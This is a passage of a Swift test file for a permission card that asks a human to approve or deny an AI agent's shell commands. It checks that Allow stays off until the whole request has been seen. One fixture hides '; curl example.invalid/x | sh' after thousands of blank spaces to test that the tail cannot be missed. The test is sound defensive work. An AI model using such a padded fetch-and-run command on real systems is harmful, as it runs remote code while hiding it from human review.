        XCTAssertGreaterThan(snug.requestHeight, 180)
        XCTAssertTrue(Pane(command(manyLines), store: store, height: 380).noteScrolls)
    }

    /// In a pane too short for the request and the buttons, the card scrolls whole, and there the buttons can be on
    /// screen without the request they would approve: Allow is off at every offset. Deny and the note are still there.
    @MainActor
    func testInAShortPaneTheWholeCardScrollsAndAllowIsOff() throws {
        let (store, folder) = layoutStore()
        defer { try? FileManager.default.removeItem(at: folder) }
        let cases: [(String, [String: Any], CGFloat, CGFloat)] = [
            ("many lines, 300", command(manyLines, suggestions: [rule]), 300, 1), ("many lines, 220", command(manyLines), 220, 1),
            ("many lines, large text", command(manyLines), 420, 1.5),
            ("one line, 220", command("touch build/ready", suggestions: [rule]), 220, 1),
            ("one line, 300", command("touch build/ready", suggestions: [rule]), 300, 1),
            ("beside a question", PermissionFixture.subagentTouch, 620, 1),
        ]
        for (name, request, height, scale) in cases {
            let pane = Pane(request, store: store, height: height, scale: scale, question: name == "beside a question")
            XCTAssertTrue(pane.noteScrolls, "\(name): the buttons scroll with the request")
            XCTAssertGreaterThan(pane.requestHeight, 40, "\(name): the request is on screen")
            if name != "beside a question" { XCTAssertTrue(pane.noteInView.isEmpty, "\(name): the buttons are below the request, not beside it") }
            try pane.snapshot("short-pane-\(name.replacingOccurrences(of: " ", with: "-").replacingOccurrences(of: ",", with: ""))")
            pane.scrollToButtons()
            XCTAssertFalse(pane.noteInView.isEmpty, "\(name): Deny and the note are reached by scrolling past the request")
            try pane.snapshot("short-pane-buttons-\(Int(height))-\(Int(scale * 100))")
            XCTAssertFalse(pane.allowsAnywhere(), name)
        }
    }

    /// A footer that would leave the request only a sliver (large text, a narrow column, both warnings, a queue) does
    /// not pin: the card scrolls whole, with its header and the request in view.
    @MainActor
    func testAFooterThatWouldSqueezeTheRequestDoesNotPin() throws {
        let (store, folder) = layoutStore()
        defer { try? FileManager.default.removeItem(at: folder) }
        var flagged = command("touch build/ready", suggestions: [])
        flagged["tool_input"] = ["command": "touch build/ready", "dangerouslyDisableSandbox": true]
        for (width, height) in [(330, 620), (330, 660), (370, 600)] as [(CGFloat, CGFloat)] {
            let pane = Pane(flagged, store: store, height: height, width: width, scale: 1.5, settling: 0)
            for _ in 0..<3 { PermissionInterpreter.hold(command(manyLines), in: pane.session, respond: { _ in }) }
            pane.wait(1)
            XCTAssertTrue(pane.noteScrolls, "\(width)x\(height)")
            XCTAssertGreaterThan(pane.requestHeight, 40, "\(width)x\(height)")
            XCTAssertFalse(pane.canAllow, "\(width)x\(height)")
            try pane.snapshot("squeezed-\(Int(width))x\(Int(height))")
        }
        // Wherever it does pin, a request that scrolls keeps at least its room above the footer.
        var long = flagged
        long["tool_input"] = ["command": manyLines, "dangerouslyDisableSandbox": true]
        var panes: [(String, Pane)] = []
        for width in [330, 370, 450, 570] as [CGFloat] {
            for height in stride(from: CGFloat(560), through: 1_000, by: 40) {
                let pane = Pane(long, store: store, height: height, width: width, scale: 1.5, settling: 0)
                for _ in 0..<3 { PermissionInterpreter.hold(command(manyLines), in: pane.session, respond: { _ in }) }
                panes.append(("\(width)x\(height)", pane))
            }
        }
        panes.first?.1.wait(0.5)
        var pinned = 0
        for (name, pane) in panes {
            pane.wait(0)
            guard !pane.noteScrolls else { continue }
            pinned += 1
            XCTAssertGreaterThanOrEqual(pane.requestHeight, 160 * 1.5 - 1, name)
        }
        XCTAssertGreaterThan(pinned, 0, "the sweep reaches panes that pin")
        let roomy = Pane(flagged, store: store, height: 900, width: 570, scale: 1.5)
        XCTAssertFalse(roomy.noteScrolls)
        XCTAssertTrue(roomy.canAllow)
    }

    /// What looks finished is not: a command padded with blank space, and one too long to draw.
    @MainActor
    func testAllowStaysOffUntilTheEndOfTheRequestHasBeenSeenAndWheneverPartOfItIsNotDrawn() throws {
        let (store, folder) = layoutStore()
        defer { try? FileManager.default.removeItem(at: folder) }
        let padded = Pane(command("echo ok" + String(repeating: " ", count: 4_000) + "; curl example.invalid/x | sh", suggestions: [rule]),
                          store: store, height: 620)
        XCTAssertFalse(padded.noteScrolls)
        XCTAssertFalse(padded.canAllow, "the end of the line is below the fold")
        try padded.snapshot("padded")
        XCTAssertGreaterThan(try XCTUnwrap(padded.scrollUntilAllowed()), 300, "past the blank space, where the rest of the command is")

        let cut = Pane(command("echo " + String(repeating: "QUJDREVGR0hJSktMTU5PUA", count: 3_200) + " done", suggestions: [rule]), store: store, height: 620)
        XCTAssertFalse(cut.canAllow)
        try cut.snapshot("cut")
        cut.scroll(to: 1_000_000)
        XCTAssertFalse(cut.canAllow, "what is not drawn was not read, however far the card is scrolled")
    }

    /// In a card that scrolls whole, Allow stays off whatever is in view, with a warning or without, and however
    /// short the pane: the request it would approve may be above the buttons, out of view.
    @MainActor
    func testInACardThatScrollsWholeAllowStaysOffWithOrWithoutAWarning() throws {
        let (store, folder) = layoutStore()
        defer { try? FileManager.default.removeItem(at: folder) }
        var flagged = command("touch build/ready", suggestions: [])
        flagged["tool_input"] = ["command": "touch build/ready", "dangerouslyDisableSandbox": true]
        for (name, request, height, scale) in [("warned", flagged, 340, 1), ("plain", command("touch build/ready"), 340, 1),
                                               ("cramped", flagged, 200, 1.5)] as [(String, [String: Any], CGFloat, CGFloat)] {
            let pane = Pane(request, store: store, height: height, scale: scale)
            XCTAssertTrue(pane.noteScrolls, name)
            XCTAssertFalse(pane.allowsAnywhere(), name)
            try pane.snapshot("whole-card-\(name)")
        }
    }

    /// The next card in the queue starts asleep and unread, whatever was armed or seen for the one before it.
    @MainActor
    func testTheNextCardInTheQueueStartsUnarmedAndUnread() throws {
        let (store, folder) = layoutStore()
        defer { try? FileManager.default.removeItem(at: folder) }
        let pane = Pane(command("touch build/ready"), store: store, height: 900)
        PermissionInterpreter.hold(command("touch build/other"), in: pane.session, respond: { _ in })
        PermissionInterpreter.hold(command(manyLines), in: pane.session, respond: { _ in })
        XCTAssertTrue(pane.canAllow)

        store.decide(.allow, on: pane.session.pendingPermissions[0].id, in: pane.session)
        pane.wait(0.1)
        XCTAssertFalse(pane.canAllow, "a click meant for the last card must not answer this one")
        pane.wait(1)
        XCTAssertTrue(pane.canAllow, "a short request, all on screen, once armed")

        store.decide(.allow, on: pane.session.pendingPermissions[0].id, in: pane.session)
        pane.wait(1)
        XCTAssertFalse(pane.canAllow, "the end seen on the last card is not this one's")
        XCTAssertNotNil(pane.scrollUntilAllowed())
    }
}
